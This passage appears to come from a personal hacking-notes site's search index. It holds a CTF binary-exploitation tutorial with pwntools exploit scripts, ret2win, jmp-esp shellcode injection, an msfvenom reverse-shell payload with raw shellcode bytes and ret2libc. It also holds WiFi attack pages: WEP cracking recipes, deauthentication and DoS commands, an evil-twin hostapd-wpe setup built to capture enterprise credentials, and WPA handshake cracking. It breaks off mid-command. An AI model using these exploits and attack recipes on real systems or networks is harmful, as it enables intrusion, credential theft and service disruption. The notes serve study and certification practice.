&lt;do_input+178&gt; push eax The desired value is 0xdeadbeef. We can confirm by overwriting the variable on the debugger. First we are going to check which is the current value of the memory address EBP - 0xc. pwndbg&gt; x $ebp -0xc 0xffffcc8c: 0x12345678 Now if we modify the 0xffffcc8c memory address to the desired one 0xdeadbeef and continue the program we will see that we complete the challange. pwndbg&gt; set *0xffffcc8c = 0xdeadbeef pwndbg&gt; x $ebp -0xc 0xffffcc8c: 0xdeadbeef pwndbg&gt; c Continuing. good job!! deadbeef [Inferior 1 (process 20292) exited normally] Finally we just need to complete our script, we need to check with file command if the binary is little or bigger endian. In that case we are working with a 32-bit LSB binary so we need to reverse the bytes. from pwn import * io = process('. overwrite') payload = 32 * b'A' + b'\\xef\\xbe\\xad\\xde' io.sendlineafter(b'?', payload) print(io.recvall().decode()) $ python3 myexploit.py [+] Starting local process '. overwrite': pid 21719 [+] Receiving all data: Done (21B) [*] Process '. overwrite' stopped with exit code 0 (pid 21719) good job!! deadbeef Ret2Win Sometimes we need to jump into a function which is never called. So we will overwrite the EIP (instruction pointer) with the desired function memory address. First of all we need to determine which input is vulnerable to BOF, then we will find hidden function and we will collect its memory address 0x08049182. pwndbg&gt; info functions All defined functions: Non-debugging symbols: 0x08049000 _init 0x08049030 printf@plt 0x08049040 puts@plt 0x08049050 __libc_start_main@plt 0x08049060 __isoc99_scanf@plt 0x08049070 _start 0x080490b0 _dl_relocate_static_pie 0x080490c0 __x86.get_pc_thunk.bx 0x080490d0 deregister_tm_clones 0x08049110 register_tm_clones 0x08049150 __do_global_dtors_aux 0x08049180 frame_dummy 0x08049182 hacked &lt;-------- 0x080491ad register_name 0x08049203 main 0x0804921f __x86.get_pc_thunk.ax 0x08049230 __libc_csu_init 0x08049290 __libc_csu_fini 0x08049291 __x86.get_pc_thunk.bp 0x08049298 _fini After crashing the program, we will see that the EIP, register which determines the return address of the function called, has been overwritten. pwndbg&gt; run Starting program: home mvaliente KaliShared learn pwn CTF pwn binary_exploitation_101 03-return_to_win ret2win Name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Hi there, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Program received signal SIGSEGV, Segmentation fault. 0x61616161 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ──────────────────────────────────────[ REGISTERS show-flags off show-compact-regs off ]─────────────────────────────────────── *EAX 0x41 *EBX 0x61616161 ('aaaa') ECX 0x0 *EDX 0xf7fc2540 ◂— 0xf7fc2540 *EDI 0xf7ffcb80 (_rtld_global_ro) ◂— 0x0 *ESI 0x8049230 (__libc_csu_init) ◂— push ebp *EBP 0x61616161 ('aaaa') *ESP 0xffffcd10 ◂— 'aaaaaaaaaaaaaaaaaaaaaa' *EIP 0x61616161 ('aaaa') Next step is control the EIP, so we need to find the offset. First we need to create a pattern. pwndbg&gt; cyclic 100 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa Once sended the payload we will see that the EIP has been overwritten with haaa. pwndbg&gt; run Starting program: home mvaliente KaliShared learn pwn CTF pwn binary_exploitation_101 03-return_to_win ret2win Name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa Hi there, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa Program received signal SIGSEGV, Segmentation fault. 0x61616168 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ──────────────────────────────────────[ REGISTERS show-flags off show-compact-regs off ]─────────────────────────────────────── *EAX 0x6f *EBX 0x61616166 ('faaa') ECX 0x0 *EDX 0xf7fc2540 ◂— 0xf7fc2540 *EDI 0xf7ffcb80 (_rtld_global_ro) ◂— 0x0 *ESI 0x8049230 (__libc_csu_init) ◂— push ebp *EBP 0x61616167 ('gaaa') *ESP 0xffffcd10 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' *EIP 0x61616168 ('haaa') With cyclic we can see the offset. pwndbg&gt; cyclic -l haaa Finding cyclic pattern of 4 bytes: b'haaa' (hex: 0x68616161) Found at offset 28 Finally we just need to send 28 bytes of dummy data and the memory address of the hacked function 0x08049182. from pwn import * io = process('. ret2win') #Hacked function address 0x08049182 payload = 28 * b'A' + b'\\x82\\x91\\x04\\x08' io.sendlineafter(b':', payload) print(io.recvall()) Note: When dealing with Little Endian, we need to reverse the bytes order. Ret2Win with Parameters Similar with no parameters, but indeed we will need to append the parameteres to the stack. Before adding ours parameters into the payload we need to specify the return address of the new function called. We can use junk data such as AAAA. After the return address we will send the parameters in order of being called. First the first parameter and after that the second and more… from pwn import * io = process('. ret2win') #Hacked function address 0x08049182 payload = 28 * b'A' + b'\\x82\\x91\\x04\\x08' + 'AAAA' + 'PARAM1' + 'PARAM2' io.sendlineafter(b':', payload) print(io.recvall()) Injecting Shellcode In the last chapters we overwrite some stack variables or return address to access to hidden functions that never have been called. Buf if NX is disabled we will be able to execute shellcode on the stack such as a reverse shell. $ checksec . server [*] ' tmp server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments Once controlled the EIP, we are going to overwrite it with the memory address of jmp %esp gadget, which can be found with ropper. $ ropper --file server --search \"jmp esp\" [INFO] Load gadgets from cache [LOAD] loading... 100% [LOAD] removing double gadgets... 100% [INFO] Searching for gadgets: jmp esp [INFO] File: server 0x0804919f: jmp esp; Creating Shellcode There are different tools to create shellcode. Shellcraft (pwntools) shellcraft is a tool to create shellcode in linux. To list available payloads we can use: shellcraft -l Finally we need to specify the payload. $ shellcraft i386.linux.sh #hex $ shellcraft i386.linux.sh -f a #asm Note: Remember to append NOPs (16) before the shellcode to ensure that is correctly loaded. Example of exploit: io = start() # Offset to EIP padding = 76 # Assemble the byte sequence for 'jmp esp' so we can search for it jmp_esp = asm('jmp esp') jmp_esp = next(elf.search(jmp_esp)) # Execute bin sh shellcode = asm(shellcraft.sh()) # Exit shellcode += asm(shellcraft.exit()) # Build payload payload = flat( asm('nop') * padding, jmp_esp, asm('nop') * 16, shellcode ) # Write payload to file write(\"payload\", payload) # Exploit io.sendlineafter(b':', payload) # Get shell io.interactive() Msfvenom msfvenom is the most usage tool to create payloads. msfvenom -p linux x86 shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b '\\x00' -f python And finally we just need to put inside our exploit. io = start() # Offset to EIP padding = 76 # Assemble the byte sequence for 'jmp esp' so we can search for it jmp_esp = asm('jmp esp') jmp_esp = next(elf.search(jmp_esp)) # Execute Reverse Shell # msfvenom -p linux x86 shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b '\\x00' -f python buf = b\"\" buf += b\"\\xbe\\x99\\xc0\\x76\\x66\\xda\\xd0\\xd9\\x74\\x24\\xf4\\x5a\\x31\" buf += b\"\\xc9\\xb1\\x12\\x31\\x72\\x12\\x03\\x72\\x12\\x83\\x73\\x3c\\x94\" buf += b\"\\x93\\xb2\\x66\\xae\\xbf\\xe7\\xdb\\x02\\x2a\\x05\\x55\\x45\\x1a\" buf += b\"\\x6f\\xa8\\x06\\xc8\\x36\\x82\\x38\\x22\\x48\\xab\\x3f\\x45\\x20\" buf += b\"\\x53\\xc0\\xb5\\xb1\\xc3\\xc2\\xb5\\xa0\\x4f\\x4a\\x54\\x72\\x09\" buf += b\"\\x1c\\xc6\\x21\\x65\\x9f\\x61\\x24\\x44\\x20\\x23\\xce\\x39\\x0e\" buf += b\"\\xb7\\x66\\xae\\x7f\\x18\\x14\\x47\\x09\\x85\\x8a\\xc4\\x80\\xab\" buf += b\"\\x9a\\xe0\\x5f\\xab\" # Build payload payload = flat( asm('nop') * padding, jmp_esp, asm('nop') * 16, buf ) # Write payload to file write(\"payload\", payload) # Exploit io.sendlineafter(b':', payload) # Get shell io.interactive() Socket Re-Use Instead of spawning a reverse shell that maybe give problems to us with bad characters we can re-use the open socket. The following shellcode works to re-use the socket. Socket Re-use Combo for linux x86 systems by ZadYree – 50 bytes buf=b\"\" buf+=b\"\\x6a\\x02\\x5b\\x6a\\x29\\x58\\xcd\\x80\\x48\\x89\\xc6\" buf+=b\"\\x31\\xc9\\x56\\x5b\\x6a\\x3f\\x58\\xcd\\x80\\x41\\x80\" buf+=b\"\\xf9\\x03\\x75\\xf5\\x6a\\x0b\\x58\\x99\\x52\\x31\\xf6\" buf+=b\"\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\" buf+=b\"\\x89\\xe3\\x31\\xc9\\xcd\\x80\"; https: www.exploit-db.com exploits 34060 Ret2Libc (Localy) This technique is very useful to execute code when NX is enabled. Since we need to know the libc memory address and other gadgets we need to exploit it localy. $ checksec secureserver [*] ' tmp secureserver' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) As allways we need to control the EIP in order to control the program flow. Firstly its important to know that the binary need to be dynamically linked. $ file secureserver secureserver: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter lib ld-linux.so.2, BuildID[sha1]=ba7b32f02b9ce5948bcb57c33599de4ad17682de, for GNU Linux 3.2.0, not stripped Dynamically linked sets means that some functions like gets or puts will been called from libc rather than been hardcoded on the binary. That code is stored on the libc library on the system. Whenever the program wants to access one of this functions will have a look to the Global Offset Table (GOT). Every libc library has different offsets, and sometimes ASLR is enabled so will need to leak the address or have local access to the system. libc has more interesting functions such as system which a string like bin sh can be passed in order to create a shell. Check ASLR To check ASLR you can check the following file on the target machine: cat proc sys kernel randomize_va_space Checking the results: Result ASLR PIE 0 OFF OFF 1 ON ON 2 OFF OFF Disable ASLR: echo 0 | sudo tee proc sys kernel randomize_va_space Enable ASLR: echo 1 | sudo tee proc sys kernel randomize_va_space Find libc address First we need to find the libc address. $ ldd secureserver linux-gate.so.1 (0xf7fc7000) libc.so.6 =&gt; lib i386-linux-gnu libc.so.6 (0xf7d7c000) lib ld-linux.so.2 (0xf7fc9000) libc.so.6: lib i386-linux-gnu libc.so.6 (0xf7d7c000) Find system function address Next step is to find the offset from libc of the system function. $ readelf -s lib i386-linux-gnu libc.so.6 | grep system 3172: 0004c800 55 FUNC WEAK DEFAULT 15 system@@GLIBC_2.0 system@@GLIBC_2.0: 0x0004c800 Find exit function address Optional, useful to avoid crashing the program while exploiting. $ readelf -s lib i386-linux-gnu libc.so.6 | grep exit 1208: 0016ee00 33 FUNC GLOBAL DEFAULT 15 quick_exit@GLIBC_2.10 1567: 0003bc90 33 FUNC GLOBAL DEFAULT 15 exit@@GLIBC_2.0 2404: 0016edd0 34 FUNC GLOBAL DEFAULT 15 atexit@GLIBC_2.0 2606: 0003d740 196 FUNC WEAK DEFAULT 15 on_exit@@GLIBC_2.0 2765: 000918c0 12 FUNC GLOBAL DEFAULT 15 thrd_exit@GLIBC_2.28 2767: 000918c0 12 FUNC GLOBAL DEFAULT 15 thrd_exit@@GLIBC_2.34 3274: 001641c0 56 FUNC GLOBAL DEFAULT 15 svc_exit@GLIBC_2.0 3288: 000df4f0 87 FUNC GLOBAL DEFAULT 15 _exit@@GLIBC_2.0 exit@@GLIBC_2.0: 0x0003bc90 Find bin sh string $ strings -a -t x lib i386-linux-gnu libc.so.6 | grep \" bin sh\" 1b5faa bin sh bin sh: 0x001b5faa Exploiting This is an example with pwntools: io = start() # Offset to EIP padding = 76 #Addresses libc_base = 0xf7d7c000 system = libc_base + 0x4c800 exit = libc_base + 0x3bc90 binsh = libc_base + 0x1b5faa # Build payload payload = flat( asm('nop') * padding, # Offset to EIP system, # Address of SYSTEM function in LIBC exit, # Return pointer binsh # Address of bin sh in LIBC ) # Save payload to a file write('payload.bin', payload) # Exploit io.sendlineafter(b':', payload) # Get shell io.interactive() Another example with struct: import struct offset = 52 overflow = \"A\" * offset libc = 0xb7e19000 system = struct.pack('&lt;I', libc + 0x0003ada0) exit = struct.pack('&lt;I', libc + 0x0002e9d0) binsh = struct.pack('&lt;I', libc + 0x0015ba0b) payload = overflow + system + exit + binsh print(payload) References https: github.com Crypto-Cat CTF tree main pwn binary_exploitation_101"
					}

					
				
			
		
			
				
					,
					

					"exploiting-buffer-overflow": {
						"id": "exploiting-buffer-overflow",
						"title": "Buffer Overflow",
						"category": "",
						"url": " /exploiting/buffer-overflow/",
						"content": "Introduction"
					}

					
				
			
		
			
				
					,
					

					"hacking-wifi-theory": {
						"id": "hacking-wifi-theory",
						"title": "Theory",
						"category": "",
						"url": " /hacking-wifi/theory/",
						"content": "It’s an introduction of hacking WiFi, I recollected from the community including others blogs for my own and guides to pass OSWP certificate. Hardware required: An antena that could configure to monitor mode: AWUS036ACH: Wide range 2.4GHz 5GHz Software required: There are some linux distributions like wifislax that could be useful to us, but I used Parrot OS distribution and Kali Linux which have almost all the programs used in that notes, if not install it with apk install aircrack-ng suite hostapd-wpe hashcat JohnTheRipper mdk3 tshark pyrit hccap2john genpmk mysql bettercap hcxdumptool WPSPinGenerator macchanger Introduction Wi-Fi allows networking of computers and digital devices without the need for wires. Data is transferred over radio frequencies, allowing Wi-Fi capable devices to receive and transmit data when they are in range of a Wi-Fi network. Wi-Fi uses a radio technology known as 802.11, which can transmit data over short distances using high frequencies. 802.11 operates on either 2.4GHz or 5GHz depending on its type. To understand how to attack WLAN, we need first to understand how it works. Take a look in detail from networking basis. OSI Model The OSI Model (Open Systems Interconnection Model) is a conceptual framework used to describe the functions of a networking system. The OSI model characterizes computing functions into a universal set of rules and requirements in order to support interoperability between different products and software. In the OSI reference model, the communications between a computing system are split into seven different abstraction layers: Physical, Data Link, Network, Transport, Session, Presentation, and Application. We are going to see Physical Layer and deep on Data link Layer. Physical Layer The physical layer is the lowest layer of the OSI Model and is concerned about how it is transmitted, via electricity, via optical or via radiofrecuence. Contain raw unstructured data bits across the network from the physical layer of the sending device to the physical layer receiving device. In case of WiFi it is transmitted via radiofrecuence. Data Link Layer At the data link layer, directly connected nodes are used to perform node-to-node data transfer where data is packaged into frames. The data link layer corrects error that may have occurred at the physical layer. Its main functions are Data Link Control and Multiple Access Control. Data Link Control The Data Link Control is responsible for reliable transmissions of messages over transmission channel by using techniques like framing, error control and flow control. For Data Link Control refer to Stop and Wait ARQ. Stop and Wait ARQ is a protocol that consist of send a packet and stop sending until we received a confirmation of received or acknowledge (ACK). Multiple Access Control If there is a dedicated link between the sender and the receiver such as a Ethernet wire between two devices then data link control is sufficient, however if there is no dedicated link present then multiple stations can access the channel simultaneously which is the case of Wi-Fi, where all clients try to send in the same medium (air). Then multiple access protocols are required to decrease collisions and avoid cross-talk. Multiple access protocols are divided in: Random Access Protocols In these types of protocols, all stations have the same priority and any station can send data depending on medium’s state, idle or busy. It has two features: There is no fixed time for sending data There is no fixed sequence of stations sending data ALOHA, CSMA, CSMA CD and CSMA CA are random access protocols. Controlled Access Protocols In these types of protocols, the data is sent by a selection which is approved by all other stations. Here appears the significant of “Token”. Reservation, Polling and Token Passing are some of the controlled access protocols. Channelization Protocols Finally, the last type are channelization protocols, where the available bandwidth of the link is shared in time, frequency and code to multiple stations to access channel simultaneously. Frequency Division Multiple Access (FDMA), where the available bandwidth is divided into equals slots so each station can be allocated in its own band. Time Division Multiple Access (TDMA), has the same logic like FDMA but here the time is divided in slots instead of frequency. Code Division Multiple Access (CDMA) where one channel carries all transmissions simultaneously. There is neither division of bandwidth nor division of time. All transmission uses different codes. Introduction to CSMA CA This method was developed to decrease the chances of collisions when two or more stations start sending their signals over the data-link layer. Carrier Sense multiple Access requires that each station check the state of the medium before sending. This protocol is used in 802.11 (WLAN). The basic idea behind CSMA CA is that the station should be able to receive while transmitting to detect a collision from different stations. In wired networks, if a collision occurs then the energy of received signal almost doubles and the station can sense the possibility of collision. In case of wireless networks, most of the energy is used for transmission and the energy of received signal increases by only 5-10% if a collision occurs so it can not be used by the station to sense collision. Therefore CSMA CA has been specially designed for wireless networks because will try to avoid these collisions. There are three types of strategies: InterFrame Space (IFS): When a station finds the channel busy, it waits for a period of time called IFS time. Also can be used to define a priority, if the IFS is higher IFS then the priority decrease. Contention Windows: It is the amount of time divided into slots. A station which is ready to send frames chooses random number of slots as wait time. Acknowledgements: The positive acknowledgements and time-out timer can help to guarantee a successful transmission of the frame. 802.11 Frame Types and Formats There are three types of 802.11 frames, which are management, control and data. Management Frames Management frames are used to manage the base station. This includes probing, associating, roaming and disconnecting clients from the base station. Association Request Response: Stations send association requests to access points (APs) requesting to join the base station or BSS. The AP responds to the station using an association response frame that includes an association ID (AID). Each station within the BSS has a unique AID. Reassociation Request Response: Stations send reassociation request to APs that wish to roam to. The AP responds to the station the same way it does in the association request response. The primary difference between reassociation and association requests it that the station will indicate the current AP it is connected to in reassociation requests. The concept of roaming is to change of AP without loosing connection. (Remember that change AP doesn’t mind change network, maybe a office have a different AP in every floor, each one connected to same router). Probe Request Response: As part of the active and passive scanning processes, stations send probe requests with a specific SSID, wildcard or null value in the SSID field to search for wireless networks. When the field is wildcard or null, the client is requesting any AP nearby to respond with all SSIDs using a probe response frame. When the probe request contains a specific SSID, the client is requesting any AP nearby to respond if they support that SSID. The probe response frame is a targeted beacon that is sent to the station who is “probing”. Beacon: APs send beacons at a regular interval called the target beacon transmit time (TBTT) to advertise the SSIDs they service. Beacons contain the configuration of the WLAN including whether it supports standards, required cipher and authentication key management methods, protection mechanisms etc. Authentication: Authentication frames are used to join the BSS as part of the open system authentication process. Open system authentication is a simple process used to verify that the station attempting to join the BSS has the capabilities to do so. The station sends an authentication request and the AP sends an authentication response. Dissasociation: A type of management frame sent from either the station or the AP. Disassociation frames are used to terminate the stations associations, it is a notification and does not expect a response. APs may disassociate clients for various reasons including failure to properly authenticate, for load balancing or timeout reasons, entering a state of maintenance, etc. Deauthentication: Deauthentication frames are used to reset the state machine for an associated client. The authentication process takes place prior to association therefor, if a station is deauthenticated, it is also disassociated. Deauthentication frames also include a reason code in the body of the frame from the table mentioned above. Action: Action frames are management frames that trigger an action to happen. The list of management frame sub types had become exhausted, so instead of creating new management frames as new technologies required them, the action frame can be used. Action frames do not expect an ACK. Timing Advertisement: Timing advertisement frames were introduced in 802.11p-2010; this standard describes how Wi-Fi can be used in vehicular environments. This type of management frame is not in use today and is expected to be used to communicate time values to devices that cannot maintain their own timing. Control Frames Control frames are used to control access to the medium and are used for frame acknowledgement. Request to Send - RTS: Stations send RTS frames to reserve the medium for the amount of time, in microseconds, found in the duration field in the frame header. The medium will not be reserved for the station until it receives a clear to send frame response from the access point. Clear to Send - CTS: Frame sent by an AP in response to an RTS. CTS messages are sent at the lowest mandatory data rate, allowing them to reach all stations in the BSS. They only use the receiver address (RA) field in the header so the station in the receiver address field is the one that will be transmitting frames. Acknowledgement - ACK: ACK frames create a delivery verification method, they are expected after the transmission of data frames to confirm receipt of the frame. If the CRC check fails, the receiver will not send an ACK and if the sender does not receive an ACK, it will retransmit the frame. PS-Poll: PS-Poll frames are used to power save method to requests framed buffered on the AP while the client was sleeping. Block ACK Block ACK Request: Block acknowledgement are used to confirm receipt of a block of QoS data frames. Beamforming Report Poll: Beamforming report poll frames are sent from the beamformer (the AP) to beamformees (STAs) to request additional feedback about the RF conditions. VHT HE NDP Announcement: Null data packet (NDP) announcement frames notify the recipient that an NDP will follow. Wi-Fi Attacks Now that we look how Wi-Fi is working we will try to attack it. Exists some differents attacks to do in Wi-Fi environments: Rogue Wireless Devices: Create a backdoor to the network installing a AP on a device. Peer-to-peer Attacks: Attack other devices connected to the same AP. Eavesdropping: Monitor wireless communications. Encryption Cracking: Try to crack the encryption on the network. (WEP technologies) Authentication Attacks: Scrap a frame exchange between a client authenticating with the network and then they simply try to run an offline dictionary attack. MAC Spoofing: Change MAC address in order to bypass mac filters on the AP. Management Interface Exploits: Exploit panel admins of the AP or routers exposed to internet. (Default login) Wireless Hijacking: Configure a Evil Twin using the same ESSID as a public hotspot. Denial of Service: Try to modify the availability of the AP. Now that we look how Wi-Fi works we will try to attack it. References: https: blog.ct-networks.io types-of-wireless-attacks-9b6ecc3317b9 https: www.geeksforgeeks.org carrier-sense-multiple-access-csma https: www.geeksforgeeks.org multiple-access-protocols-in-computer-network https: www.ionos.com digitalguide server know-how csmaca-carrier-sense-multiple-access-with-collision-avoidance https: www.geeksforgeeks.org stop-and-wait-arq https: howiwifi.com 2020 07 13 802-11-frame-types-and-formats #:~:text=There are three types of,the layer 3%2D7 information. https: gist.github.com s4vitar 3b42532d7d78bafc824fb28a95c8a5eb https: rootsh3ll.com evil-twin-attack"
					}

					
				
			
		
			
				
					,
					

					"hacking-wifi-wep": {
						"id": "hacking-wifi-wep",
						"title": "Hacking Wifi - WEP",
						"category": "",
						"url": " /hacking-wifi/wep/",
						"content": "Less probabable to find it today but important to have notes about how to attack them. Fake Authentication Attack airmon-ng start wlan0 airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreCaptura&gt; wlan0mon # Identificamos nuestra MAC macchanger --show wlan0mon aireplay-ng -1 0 -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -e &lt;ESSID&gt; wlan0mon aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon aircrack-ng –b &lt;BSSID&gt; &lt;archivoPCAP&gt; ARP Replay Attack airmon-ng start wlan0 airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreCaptura&gt; wlan0mon # Identificamos nuestra MAC macchanger --show wlan0mon aireplay-ng -3 –x 1000 –n 1000 –b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon aircrack-ng –b &lt;BSSID&gt; &lt;archivoPCAP&gt; Chop Chop Attack airmon-ng start wlan0 airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon # Identificamos nuestra MAC macchanger --show wlan0mon aireplay-ng -1 0 –e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon aireplay-ng -4 –b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon # Presionamos ‘y’ ; packetforge-ng -0 –a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -k &lt;SourceIP&gt; -l &lt;DestinationIP&gt; -y &lt;XOR_PacketFile&gt; -w &lt;FileName2&gt; aireplay-ng -2 –r &lt;FileName2&gt; wlan0mon aircrack-ng &lt;archivoPCAP&gt; Fragmentation Attack airmon-ng start wlan0 airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon # Identificamos nuestra MAC macchanger --show wlan0mon aireplay-ng -1 0 –e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon aireplay-ng -5 –b&lt;BSSID&gt; -h &lt;nuestraMAC &gt; wlan0mon # Presionamos ‘y’ ; packetforge-ng -0 –a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -k &lt;SourceIP&gt; -l &lt;DestinationIP&gt; -y &lt;XOR_PacketFile&gt; -w &lt;FileName2&gt; aireplay-ng -2 –r &lt;FileName2&gt; wlan0mon aircrack-ng &lt;archivoPCAP&gt; SKA Type Cracking airmon-ng start wlan0 airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon aireplay-ng -0 10 –a &lt;BSSID&gt; -c &lt;macVictima&gt; wlan0mon ifconfig wlan0mon down macchanger –-mac &lt;macVictima&gt; wlan0mon ifconfig wlan0mon up aireplay-ng -3 –b &lt;BSSID&gt; -h &lt;macFalsa&gt; wlan0mon aireplay-ng –-deauth 1 –a &lt;BSSID&gt; -h &lt;macFalsa&gt; wlan0mon aircrack-ng &lt;archivoPCAP&gt;"
					}

					
				
			
		
			
				
					,
					

					"hacking-wifi-wpa-wpa2-peap-enterprise": {
						"id": "hacking-wifi-wpa-wpa2-peap-enterprise",
						"title": "Hacking Wifi - WPA/WPA2 PEAP (Enterprise)",
						"category": "",
						"url": " /hacking-wifi/wpa-wpa2-peap-enterprise/",
						"content": "In networks with WPA2 PEAP which means Enterprise don’t use a pre shared key, the users authenticate with the LDAP credentials. As the router or AP doesn’t know if the credentials are correct or not, it delegate to a RADIUS server. The handshake can’t not be capture because the authentication is not completed by the server so instead of capturing the handshake we will create a EvilTwin but in this case with authentication (Which we are interesting to capture, remember that there are LDAP credentials). EvilTwin To carry out this task, we are going to use hostapd-wpe software. Configuring Certificates First we need to aclare that when the user will authenticate to our fake AP, some information about the certificate will be displayed, in order to cheat our víctims, the certificate will seems as much real as posible. So we need to modify the following files: etc hostapd-wpe certs server.cnf [server] countryName = ES stateOrProvinceName = Salamanca localityName = Salamanca organizationName = Red Team Inc. emailAddress = admin@redteam.com commonName = \"Certificado de Red Team Inc.\" etc hostapd-wpe certs client.cnf [client] countryName = ES stateOrProvinceName = Salamanca localityName = Salamanca organizationName = Red Team Inc. emailAddress = user@redteam.com commonName = user@redteam.com etc hostapd-wpe certs ca.cnf [certificate_authority] countryName = ES stateOrProvinceName = Salamanca localityName = Salamanca organizationName = Red Team Inc. emailAddress = admin@redteam.com commonName = \"Entidad certificadora de Red Team Inc.\" Finally, we just need to create it with bootstrap. etc hostapd-wpe certs bootstrap Configuring te Fake AP Onced configured and created the certificates, the final step is to configure our FAKE AP. We need to create a backup of the default hostapd config file and modify it. cp etc hostapd-wpe hostapd-wpe.conf etc hostapd-wpe redteam.conf vim etc hostapd-wpe redteam.conf #Modify the following values: interface=&lt;IFACE&gt; ssid=&lt;ESSID&gt; channel=&lt;CHANNEL&gt; Launch &amp; wait for s3crets Finally, just launch the hostapd-wpe indicating the modified configuration file. hostapd-wpe etc hostapd-wpe redteam.conf When the victim falls into our trap, we can obtain their NETLM hash."
					}

					
				
			
		
			
				
					,
					

					"hacking-wifi-wpa-wpa2-psk": {
						"id": "hacking-wifi-wpa-wpa2-psk",
						"title": "Hacking Wifi - WPA/WPA2 PSK",
						"category": "",
						"url": " /hacking-wifi/wpa-wpa2-psk/",
						"content": "Introduction Setup sudo airmon-ng check kill sudo airmon-ng sudo airmon-ng start wlan0 # Change MAC ifconfig wlan0mon down macchanger -s wlan0mon ifconfig wlan0mon up To restart network services: sudo airmon-ng stop wlan1mon sudo service NetworkManager restart Start capturing: # 802.11.g is for 5GHz if you don't have the suitable hardwarte try to use --band ab sudo airodump-ng -c &lt;CH&gt; --bssid &lt;BSSID&gt; [--band abg] --write &lt;OUT_FILE&gt; &lt;IFACE&gt; Handshake Capture (Clients needed) Deauth Consist on deauthenticate a client in order to capture de re-authentication handshake. aireplay-ng -0 10 -a &lt;BSSID&gt; -c &lt;CLIENT&gt; &lt;IFACE&gt; Deauth Global The same term of deauthentication, but in that case using the brodcast MAC address in order to deauthenticate all clients. airplay-ng -0 0 -e &lt;ESSID&gt; -c FF:FF:FF:FF:FF:FF &lt;IFACE&gt; Auth attack or Authentication DoS Mode Could be sound strange, but if you authenticate 5000 clients to the Access Point is possible to kick out client of the network and then capture their handshake. airplay-ng -1 0 -e &lt;ESSID&gt; -h 00:a0:8b:cd:02:65 &lt;IFACE&gt; #To authenticate 1 client mdk3 &lt;IFACE&gt; a -a &lt;BSSID&gt; #Authenticating clients until DoS Finally the AP will eject the clients with less power rate. Dissassociation Amok Mode Attack Same as deauthentication attack but mdk3 gives us the opportunity to introduce allow deny lists. blacklist.txt: a0:e4:b2:45:f6:87 mdk3 &lt;IFACE&gt; d -w blacklist.txt -c 1 Validating the handshake Sometimes aircrack-ng tells us that it capture a handshake when it hasn’t. So we can validate it with pyrit. pyrit -r Capture-01.cap analyze Filtering the capture When we are trying to capture a handshake, maybe we are capturing a lot of packets, so we just need to filter that. (EAPOL -&gt; Handshakes) (wlan.fc.type_subtype==0x08 are Beacons) (wlan.fc.type\\_subtype==0x05 are Probe Response) tshark -r Capture-01.cap -Y \"wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol\" -F pcap 2&gt; dev null tshark -r Capture-01.cap -Y \"wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol\" -w filteredCapture -F pcap 2&gt; dev null pyrit -r filteredCapture analyze Also it is recommended filtering with the target BSSID. tshark -r Capture-01.cap -Y \"(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;&amp; wlan.addr==20:34:fb:b1:c5:53\" -w filteredCapture -F pcap 2&gt; dev null IF you want to do a doble analysis you may change -Y parameter to -R \"FILTER\" -2 tshark -r Capture-01.cap -R \"(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;&amp; wlan.addr==20:34:fb:b1:c5:53\" -2 -w filteredCapture -F pcap 2&gt; dev null Hash extraction First we need to save our handshaek in HCCAP to after use hccap2john and crack it. aircrack-ng -J capture Capture-01.cap # For john hccap2john capture.hccap &gt; handshake.hash aricrack-ng -j capture Capture-01.cap # For hashcat Cracking the hanshake Dictionary Attack john --wordlist= usr share wordlist rockyou.txt handshake.hash --format=wpapsk john --show --format=wpapsk handshake.hash aircrack-ng -w usr share wordlist rockyou.txt Capture-01.cap hashcat -m 2500 -d 1 capture.hccapx usr share wordlists rockyou.txt --force -w 3 hashcat --show -m 2500 capture.hccapx Rainbow Table Airolib + Aircrack With airolib we can create a dictionary with PMKS. airolig-ng passwords-airolib 